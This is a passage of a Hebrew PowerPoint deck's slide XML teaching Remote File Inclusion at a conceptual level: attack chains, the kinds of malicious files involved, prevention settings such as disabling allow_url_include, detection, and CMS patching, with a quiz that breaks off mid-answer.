              <a:t>relative path </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שמוביל לספרייה ספציפית במערכת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>בדיקת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>קלטים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בדוק היטב את </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הקלטים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של המשתמש. אל תאפשר להכניס קבצים מהאינטרנט, ותמיד בדוק שהקובץ מגיע מהשרת שלך בלבד.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>השתמש בפתרונות אבטחה כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>WAF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :WAF (Web Application Firewall):</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>יכול לעזור לסנן בקשות חשודות שמנסות לנצל </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>RFI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="400247004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4FB9453-EBD2-42E7-ACF4-DFCB69B50BCF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1262270" y="642594"/>
            <a:ext cx="9862929" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפות שרשרת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (Chain Attacks) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>עם </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>RFI</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9916CA9C-C4D4-4390-949D-EA81C4533373}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לעיתים קרובות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>RFI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> אינה המטרה הסופית של התוקף אלא חלק משרשרת התקפות. לאחר שתוקף מצליח להכניס קובץ מרוחק לשרת, הוא עשוי להשתמש בכך כדי להשיג גישה נוספת או לבצע התקפות נוספות כמו:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הזרקת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>:SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> התוקף עשוי לשלב קוד זדוני בקובץ המרוחק שמנצל גם פגיעות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מה שיאפשר לו לגשת למידע רגיש במסד הנתונים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :Cross-Site Scripting (XSS)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התוקף עשוי להזריק קוד</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> JavaScript </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שירוץ בדפדפני המשתמשים ויבצע פעולות בשמם.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>פריצה למערכות נוספות:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ברגע שהתוקף שולט בשרת, הוא יכול להשתמש בו כנקודת גישה להמשך התקפות על מערכות נוספות בתוך הרשת הפנימית.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="374304756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6774FF1-403B-42C4-ACD6-5E21D11A7F04}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1162878" y="642594"/>
            <a:ext cx="9962322" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>סוגי קבצים זדוניים שניתן להעלות ב- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>RFI</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C8968E71-4CD5-4052-8F62-07F44939AA3B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :Web Shells</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אלה הם סקריפטים (בדרך כלל ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> PHP, ASP, JSP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>וכו') המאפשרים לתוקף לשלוט מרחוק בשרת דרך דפדפן. דוגמאות לכלים כאלו כוללות את</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> R57 shell ,C99 shell </a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>קבצי סקריפט להפעלה עצמית:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> תוקף יכול להכניס סקריפטים שמבצעים פעולות זדוניות באופן אוטומטי, כמו מחיקת קבצים, שינוי הרשאות, או יצירת משתמשים חדשים בשרת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>קבצים לפעולות ריגול:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> תוקף יכול להכניס קובץ שמאזין לתעבורת הנתונים על השרת או חוטף </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>סשנים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של משתמשים.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="204754105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FECA17C-113C-40E7-905D-2AA737934AD6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1222512" y="642594"/>
            <a:ext cx="9902687" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מניעת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> RFI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>באמצעות טכניקות מתקדמות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{56BDB306-2CC0-4F87-9798-D7AFE905ED3E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הגבלת סוגי הקבצים שניתן להעלות:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> יש להגדיר את השרת כך שיטעין רק סוגים ספציפיים של קבצים, ולוודא שהם בטוחים (כמו קבצי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> .PHP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מסוימים שנמצאים רק בספריות מאושרות).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שרשור נתיבים עם פונקציות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>PHP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: שימוש בפונקציות כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>REALPATH ()</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי לוודא שהנתיב שהמשתמש מספק הוא תקין ומוביל לספרייה הנכונה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>התאמה אישית של הגדרות ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :PHP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>השבתת האפשרות להכליל קבצים חיצוניים עם פונקציות כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>allow_url_include</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>PHP.ini</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שימוש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Content Security Policy (CSP)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: הגבלת המקורות מהם ניתן להפעיל סקריפטים בדפי האינטרנט על ידי הגדרת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>CSP</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="87681903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5EF3F0-C6E2-414E-B840-23C5BEA927B0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5824330" y="642594"/>
            <a:ext cx="5300869" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>זיהוי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> RFI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ותגובה מהירה</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3063D4A7-4656-432A-AF1D-9E22F6F3379C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>זיהוי תעבורת רשת חשודה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מעקב אחר תעבורת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> HTTP/HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שמצביעה על גישה לקבצים ממקורות חיצוניים או ניסיונות לגשת לקבצים שלא צריכים להיות נגישים מחוץ לשרת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שימוש בכלי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>IDS/IPS (Intrusion Detection/Prevention Systems)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: מערכות אלו יכולות לזהות ניסיונות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>RFI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ולחסום אותם בזמן אמת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>לוגים ובדיקת גישה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בדוק את לוגי הגישה לשרת כדי לזהות ניסיונות לגשת לקבצים דרך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ונסה לזהות דפוסים חשודים של פרמטרים.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="216842010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F50FAD3-3FA1-4221-BD3D-06B4BD940092}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2365512" y="642594"/>
            <a:ext cx="8759687" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אבטחת פלטפורמות נפוצות (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(CMS</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{92280240-8F4F-41A7-B9FC-0A60505CB5E4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>פלטפורמות כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> WordPress, Joomla</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ו-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Drupal </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הן מטרות נפוצות להתקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>RFI </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בגלל </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פופולריותן</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> והרחבות התוספים שלהן. על מנהלי אתרים לוודא שכל התוספים והערכות מותקנות מעודכנים לגרסאות האחרונות ושלא קיימות פגיעות מוכרות בהן.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4222516721"/>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B5B81D-3194-4EA2-B41E-DD13B56D6D4B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7812156" y="642594"/>
            <a:ext cx="3313043" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>RFI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> - שאלות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6FDAEC7D-6A1B-49D8-9A00-D030D22BBDFD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. מהו ההבדל בין </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Remote File Inclusion (RFI) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ל-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Local File Inclusion (LFI) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. כיצד תוקף יכול להשתמש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>RFI </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי ליצור "דלת אחורית" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Backdoor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בשרת?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. כיצד ניתן למנוע מתקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>RFI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> באפליקציות אינטרנטיות?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="344016649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5D7F64B-75B2-4942-B2AB-5CB23E13BCEA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7663070" y="642594"/>
            <a:ext cx="3462130" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>RFI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> - תשובות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1BA20B68-A2D0-405D-A7F6-FC20A18A52CB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>RFI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מאפשר לתוקף לכלול ולהפעיל קובץ מרוחק מהאינטרנט על השרת, בעוד ש-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>LFI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מאפשר לתוקף להפעיל קובץ מקומי שנמצא כבר על השרת. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>RFI </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> נחשב למסוכן יותר מכיוון שהוא מאפשר הכנסת קוד זדוני מרוחק, אך</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> LFI </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>יכול להיות מסוכן גם כן אם הוא מאפשר לתוקף לגשת לקבצים רגישים שנמצאים על השרת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. תוקף יכול להשתמש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>RFI </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי להכניס קובץ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> PHP</a:t>
            </a:r>
            <a:r>
